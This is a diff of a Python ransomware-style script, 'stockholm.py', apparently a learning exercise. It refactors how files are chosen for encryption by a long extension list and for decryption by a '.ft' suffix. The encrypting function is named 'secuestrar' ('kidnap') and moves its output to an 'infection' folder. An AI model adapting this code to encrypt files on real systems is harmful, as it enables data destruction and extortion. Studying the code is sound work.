@@ -12,7 +12,7 @@ from cryptography.fernet import Fernet
 
 
 # Variables globales (y sus valores por defecto).
-ver_sem = "0.1"
+ver_sem = "0.2"
 extensiones = ['.123', '.3dm', '.3ds', '.3g2', '.3gp', '.602', '.7z', '.ARC', '.PAQ', '.accdb', '.aes', '.ai', '.asc',
                '.asf', '.asm', '.asp', '.avi', '.backup', '.bak', '.bat', '.bmp', '.brd', '.bz2', '.c', '.cgm',
                '.class', '.cmd', '.cpp', '.crt', '.cs', '.csv', '.db', '.dbf', '.dch', '.der', '.dif', '.dip', '.djvu',
@@ -65,16 +65,41 @@ def inicializar_analizador():
     return analizador.parse_args()
 
 
-# Encripta los archivos del directorio de este script que tenga alguna de las extensiones indicadas.
+# Comprueba que un fichero tiene alguna de las extensiones indicadas.
+def validar_fichero(elemento, modo):
+    # El objeto es un fichero, pero ninguno 'importante'.
+    if os.path.isfile(elemento) and elemento not in ["stockholm.py", "clave.key"]:
+
+        # Comprobar validez respecto al cifrado (extensiones compatibles).
+        if modo == "c":
+            # Comprobar la extensión.
+            for extension in extensiones:
+                if elemento.endswith(extension):
+                    return True
+
+        # Comprobar validez respecto al descifrado (extensión es ' .ft').
+        elif modo == "d":
+            # Comprobar la extensión.
+            if elemento.endswith(".ft"):
+                return True
+
+        else:
+            print("Error: modo inexistente de validación de fichero.")
+            exit(1)
+
+    return False
+
+
+# Cifra los archivos del directorio de este script que tenga alguna de las extensiones indicadas.
 # Una vez cifrados les añade la extensión '.ft' y los guarda en un directorio llamado 'infection'.
 def secuestrar():
     ficheros = []
 
-    # Obtener todos los ficheros (no carpetas) del directorio de este script.
-    for fichero in os.listdir("."):
-        # Evitar añadir tanto este script como la clave que genera.
-        if os.path.isfile(fichero) and fichero not in ["stockholm.py", "clave.key"]:
-            ficheros.append(fichero)
+    # Obtener todos los elementos en el directorio de este script.
+    for elemento in os.listdir("."):
+        # Comprobar la validez del fichero para su cifrado.
+        if validar_fichero(elemento, "c"):
+            ficheros.append(elemento)
 
     if not silencio:
         print("Ficheros:", sorted(ficheros))
@@ -108,11 +133,11 @@ def secuestrar():
 def liberar():
     ficheros = []
 
-    # Obtener todos los ficheros (no carpetas) del directorio de este script.
-    for fichero in os.listdir("."):
-        # Evitar añadir tanto este script como la clave que genera.
-        if os.path.isfile(fichero) and fichero.endswith(".ft") and fichero not in ["stockholm.py", "clave.key"]:
-            ficheros.append(fichero)
+    # Obtener todos los elementos en el directorio de este script.
+    for elemento in os.listdir("."):
+        # Comprobar la validez del elemento para su descifrado.
+        if validar_fichero(elemento, "d"):
+            ficheros.append(elemento)
 
     if not silencio:
         print("Ficheros:", sorted(ficheros))
